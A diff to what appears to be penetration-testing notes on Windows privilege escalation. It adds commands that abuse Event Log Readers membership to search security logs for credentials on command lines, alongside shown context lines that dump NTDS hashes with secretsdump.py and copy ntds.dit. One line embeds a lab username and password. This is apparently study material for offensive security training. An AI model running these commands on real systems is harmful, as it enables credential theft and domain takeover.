@@ -56,8 +56,22 @@ Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,D
 
 `secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL`
 
-
 ### Robocopy
 [Robocopy](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
 
 `robocopy /B E:\Windows\NTDS .\ntds ntds.dit`
+
+# Event Log Readers
+
+```Powershell
+net localgroup "Event Log Readers"
+
+# Searching security logs using wevtutil
+wevtutil qe Security /rd:true /f:text | Select-String "/user"
+wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
+
+# Searching Security Logs using Get-WinEvent
+Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
+```
+
+The cmdlet can also be run as another user with the `-Credential` parameter.
